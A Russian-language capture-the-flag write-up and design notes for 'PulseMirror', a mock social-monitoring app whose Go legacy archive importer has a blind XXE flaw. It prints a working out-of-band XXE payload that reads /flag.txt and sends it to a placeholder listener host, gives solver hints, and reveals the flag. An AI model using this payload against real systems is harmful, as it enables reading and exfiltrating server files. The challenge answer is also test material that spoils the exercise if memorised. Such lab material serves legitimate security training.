# PulseMirror Writeup

## Кратко

Уязвимость находится в legacy-импорте SocialVault archive.

Штатный UI делает `GET`-запрос за XML-архивом:

```http
GET /api/archive/import?id=sv-7142
Accept: application/xml, text/xml, */*
```

Ответ содержит обычный XML-документ. Через него игрок узнает структуру тегов.

Дальше запрос вручную меняется на `POST` с `Content-Type: application/xml`, а в тело добавляется XML с `DOCTYPE`. Так как XXE blind, флаг не отражается в HTTP-ответе. Нужно поднять свой HTTP/DNS listener и заставить backend сделать исходящий запрос.

## Discovery тегов

Нужно нажать `Import archive` -> `Import to workspace` и перехватить запрос в Burp Suite.

Backend вернет XML примерно такого вида:

```xml
<?xml version="1.0"?>
<socialArchive exportedAt="2026-05-18T09:30:00Z">
  <profile id="acct-7142">
    <handle>@mira_ops</handle>
    <displayName>Mira Operations</displayName>
    <network>Chatter</network>
    <risk>low</risk>
  </profile>
  <posts>
    <post id="p-9182">
      <text>Maintenance window completed. Access restored.</text>
      <likes>18</likes>
      <shares>4</shares>
    </post>
  </posts>
</socialArchive>
```

Из ответа видны нужные теги:

- `socialArchive`
- `profile`
- `handle`
- `displayName`
- `network`
- `risk`
- `posts`
- `post`
- `text`
- `likes`
- `shares`

## Эксплуатация

Поднять listener на своей стороне:

```bash
python3 -m http.server 8000
```

Адрес listener должен быть доступен backend-контейнеру. Для локального Docker/VM это может быть IP хоста в сети контейнера. Для удаленной задачи удобнее использовать публичный webhook или Burp Collaborator.

В Burp Repeater поменять штатный `GET` на `POST`:

```http
POST /api/archive/import HTTP/1.1
Host: target
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE socialArchive [
  <!ENTITY % file  SYSTEM "file:///flag.txt">
  <!ENTITY % exfil SYSTEM "http://YOUR_HOST:8000/?x=%file;">
]>
<socialArchive exportedAt="2026-05-18T09:30:00Z">
  <profile id="acct-7142">
    <handle>@mira_ops</handle>
    <displayName>Mira Operations</displayName>
    <network>Chatter</network>
    <risk>low</risk>
  </profile>
</socialArchive>
```

Заменить `YOUR_HOST` на адрес своего listener.

> ВАЖНО про формат payload. Backend использует **самописный** парсер сущностей
> (regex, `main.go`), а не полноценный XML-парсер. Есть две особенности, которые
> определяют вид рабочего payload:
>
> 1. `%`-ссылки раскрываются **прямо внутри SYSTEM-идентификатора** до его резолва,
>    поэтому `%file;` можно вставлять сразу в OOB-URL:
>    `<!ENTITY % exfil SYSTEM "http://YOUR_HOST:8000/?x=%file;">`.
> 2. SYSTEM-сущность резолвится при **объявлении** — ссылаться на `%exfil;` в теле
>    не нужно, запрос уйдёт сам.
>
> Из-за этого **классический вложенный OOB-DTD не работает**:
> ```xml
> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_HOST:8000/?x=%file;'>">
> %eval;
> ```
> значение сущности захватывается регуляркой как `[^'"]*`, то есть **не может содержать
> кавычек** — вложенное объявление обрывается на первой `'`, и callback не срабатывает.
> Проверено: рабочий вариант — только «плоский», как выше.

## Ожидаемый результат

Ответ backend будет выглядеть как async job:

```json
{"jobId":"imp_...","status":"queued","message":"Archive accepted for background processing"}
```

Флаг в ответе не появится. Его нужно смотреть в логах listener, куда backend сделает OOB-запрос:

```text
GET /?x=ctf%7B...%7D
```

После URL decode получится флаг.

## Почему это blind XXE

Backend принимает XML и обрабатывает `DOCTYPE`/external entities в legacy-compat слое, но HTTP-ответ импорта всегда возвращает только статус job. Поэтому прочитанное значение нельзя получить напрямую в response body. Единственный рабочий канал - исходящий запрос backend к серверу игрока.
## Что видит участник

Участник видит веб-интерфейс просмотра соцсетей:

- лента постов;
- карточки профилей;
- поиск по аккаунтам;
- тренды и risk score;
- кнопка `Import archive`.

Кнопка открывает панель загрузки legacy archive. Фронт делает штатный запрос к legacy endpoint и просит XML-архив:

```text
GET /api/archive/import?id=sv-7142
Accept: application/xml
```

## Пример штатного архива

```xml
<?xml version="1.0"?>
<socialArchive exportedAt="2026-05-18T09:30:00Z">
  <profile id="acct-7142">
    <handle>@mira_ops</handle>
    <displayName>Mira Operations</displayName>
    <network>Chatter</network>
    <risk>low</risk>
  </profile>
  <posts>
    <post id="p-9182">
      <text>Maintenance window completed. Access restored.</text>
      <likes>18</likes>
      <shares>4</shares>
    </post>
  </posts>
</socialArchive>
```

## Уязвимость

Backend на Go отдает штатный XML на `GET /api/archive/import`. Legacy worker также принимает `POST /api/archive/import` с `Content-Type: application/xml` и передает тело в совместимый со старыми архивами XML parser.

Для blind XXE backend не должен отражать содержимое XML entity в HTTP-ответе. Нормальный ответ POST-импорта выглядит как async job:

```json
{
  "jobId": "imp_7f3a91",
  "status": "queued",
  "message": "Archive accepted for background processing"
}
```

Эксплуатация blind XXE должна завязываться на out-of-band callback, например DNS/HTTP-запрос из парсера во внутренний collector.

Флаг положить в контейнер:

```text
/flag.txt
```

Так как ответ **не отражает** содержимое сущности (только `jobId`), обычный
reflected-XXE вида `<!ENTITY xxe SYSTEM "file:///flag.txt">` + `&xxe;` в
`<displayName>` **не сработает** — значение просто некуда вывести. Нужен OOB.

Рабочий XML в POST body (тот же «плоский» payload, что и в разделе «Эксплуатация»):

```xml
<?xml version="1.0"?>
<!DOCTYPE socialArchive [
  <!ENTITY % file  SYSTEM "file:///flag.txt">
  <!ENTITY % exfil SYSTEM "http://YOUR_HOST:8000/?x=%file;">
]>
<socialArchive exportedAt="2026-05-18T09:30:00Z">
  <profile id="acct-7142">
    <handle>@mira_ops</handle>
    <displayName>Mira Operations</displayName>
    <network>Chatter</network>
    <risk>low</risk>
  </profile>
</socialArchive>
```

## Почему фронт менее очевидный

Основной экран не выглядит как "форма XML". Это полноценный фейковый продукт:

- лента уже заполнена постами;
- импорт архива выглядит как одна из рабочих функций;
- XML не упоминается в заголовке страницы;
- вкладки `Profiles`, `Mentions`, `Watchlists`, `Archive Vault` выглядят как реальные разделы продукта;
- штатный UI делает GET, а уязвимый POST-путь становится заметен при ручной проверке legacy endpoint;
- задача маскируется под OSINT/social monitoring.

## Подсказки

Мягкая:

> Legacy archive imports still carry their original document header.

Средняя:

> The legacy SocialVault importer accepts the original document header.

Сильная:

> Check how the archive parser handles document type declarations.

## Флаг

```text
ctf{social_archives_can_have_old_parser_bugs}
```

## Файлы

- `index.html` - интерфейс PulseMirror.
- `styles.css` - оформление.
- `app.js` - логика UI и штатный GET-запрос на `/api/archive/import` с `Accept: application/xml`.
- `main.go` - минимальный Go backend: раздает фронт и принимает импорт архивов.

## Backend

Запуск:

```bash
go run .
```

Сервис поднимается на:

```text
http://localhost:8080
```

Эндпоинт импорта:

```text
GET /api/archive/import
Accept: application/xml

POST /api/archive/import
Content-Type: application/xml
```

XML-теги, которые использует архив:

- `socialArchive` - корневой тег, атрибут `exportedAt`.
- `profile` - профиль аккаунта, атрибут `id`.
- `handle` - публичный handle.
- `displayName` - отображаемое имя.
- `network` - источник/соцсеть.
- `risk` - уровень риска.
- `posts` - список постов.
- `post` - пост, атрибут `id`.
- `text`, `likes`, `shares` - поля поста.

Go-бэк на `GET` возвращает штатный XML с XML declaration. На `POST` он принимает XML body и передает его в legacy-compat обработчик. Ответ не отражает содержимое entity и выглядит как async job, поэтому задача остается blind XXE/OOB.

Ожидаемый путь игрока:

1. Нажать импорт архива и перехватить штатный `GET /api/archive/import` в Burp Suite.
2. По `Accept: application/xml` и XML declaration в ответе понять структуру legacy archive.
3. Изменить запрос на `POST /api/archive/import`.
4. Поставить `Content-Type: application/xml` и добавить XML body с `DOCTYPE`.
5. Поднять свой HTTP/DNS listener и использовать OOB callback, потому что HTTP-ответ импорта возвращает только queued job и не отражает entity.
